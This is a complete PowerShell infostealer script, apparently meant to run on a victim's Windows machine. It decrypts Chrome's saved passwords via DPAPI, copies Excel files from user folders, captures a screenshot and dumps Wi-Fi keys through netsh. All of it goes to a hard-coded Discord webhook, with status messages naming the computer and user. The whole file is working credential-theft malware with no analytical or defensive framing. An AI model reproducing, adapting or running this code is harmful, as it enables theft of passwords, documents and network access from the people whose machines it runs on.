# ===== COMPLETE PAYLOAD WITH CHROME PASSWORD DECRYPTION =====
$webhook = "https://ptb.discord.com/api/webhooks/1484372266710995026/jhpU0776tLsCjRN_RiwfH5PFTHg1XaZQJOTcdw0FEBtANImdnEZ4cjf6sT_sh8mHgdbU"

function Send-Discord {
    param($msg)
    try {
        $body = @{content = $msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    } catch {}
}

function Send-File {
    param($path, $caption)
    try {
        $multipart = @{file = Get-Item $path; payload_json = @{content = $caption} | ConvertTo-Json}
        Invoke-RestMethod -Uri $webhook -Method Post -Form $multipart -UseBasicParsing
    } catch {}
}

# ===== DECRYPT CHROME PASSWORDS =====
function Get-ChromePasswords {
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $tempDb = "$env:temp\chrome_logins.db"
    $results = @()
    
    if (Test-Path $chromePath) {
        Copy-Item $chromePath $tempDb -Force
        
        # Load necessary assemblies
        Add-Type -AssemblyName System.Data.SQLite
        Add-Type -AssemblyName System.Security
        
        try {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            while ($reader.Read()) {
                $url = $reader.GetString(0)
                $username = $reader.GetString(1)
                $encryptedBytes = $reader.GetValue(2)
                
                if ($encryptedBytes -and $username) {
                    try {
                        # Decrypt using Windows DPAPI
                        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                        $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                        $results += "[$url] $username : $password"
                    } catch {
                        $results += "[$url] $username : [DECRYPT FAILED]"
                    }
                }
            }
            $conn.Close()
        } catch {
            $results += "ERROR: $_"
        }
        
        Remove-Item $tempDb -Force
    } else {
        $results += "Chrome not found or no saved passwords"
    }
    
    return $results
}

# ===== EXTRACT PASSWORDS =====
Send-Discord "🚀 PAYLOAD STARTED on $env:COMPUTERNAME - $env:USERNAME"

$passwords = Get-ChromePasswords
if ($passwords.Count -gt 0) {
    Send-Discord "🔐 CHROME PASSWORDS ($($passwords.Count)):"
    foreach ($pass in $passwords) {
        # Split long messages
        if ($pass.Length -gt 1900) {
            $chunks = [math]::Ceiling($pass.Length / 1900)
            for ($i = 0; $i -lt $chunks; $i++) {
                $chunk = $pass.Substring($i * 1900, [math]::Min(1900, $pass.Length - ($i * 1900)))
                Send-Discord "```$chunk```"
            }
        } else {
            Send-Discord "```$pass```"
        }
        Start-Sleep -Milliseconds 200
    }
} else {
    Send-Discord "No Chrome passwords found"
}

# ===== EXCEL FILES =====
$excelFiles = Get-ChildItem "C:\Users\$env:USERNAME\Desktop", "C:\Users\$env:USERNAME\Documents", "C:\Users\$env:USERNAME\Downloads" -Filter "*.xlsx" -File -ErrorAction SilentlyContinue
if ($excelFiles) {
    Send-Discord "📊 EXCEL FILES: $($excelFiles.Count)"
    foreach ($file in $excelFiles) {
        if ($file.Length -lt 8MB) {
            $temp = "$env:temp\$($file.Name)"
            Copy-Item $file.FullName $temp -Force
            Send-File -path $temp -caption "📎 $($file.Name)"
            Remove-Item $temp -Force
        }
    }
}

# ===== SCREENSHOT =====
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
    $screenshot = "$env:temp\screen.png"
    $bitmap.Save($screenshot)
    Send-File -path $screenshot -caption "🖥️ SCREENSHOT"
    Remove-Item $screenshot -Force
} catch {}

# ===== WIFI PASSWORDS =====
try {
    $wifi = netsh wlan show profiles | Select-String "Profil utilisateur" | ForEach-Object {
        $name = ($_ -split ":")[1].Trim()
        $pass = netsh wlan show profile name="$name" key=clear | Select-String "Contenu de la clé"
        if ($pass) {
            $p = ($pass -split ":")[1].Trim()
            "[$name] $p"
        }
    }
    if ($wifi) {
        Send-Discord "📶 WIFI:`n$($wifi -join "`n")"
    }
} catch {}

Send-Discord "✅ DONE on $env:COMPUTERNAME"
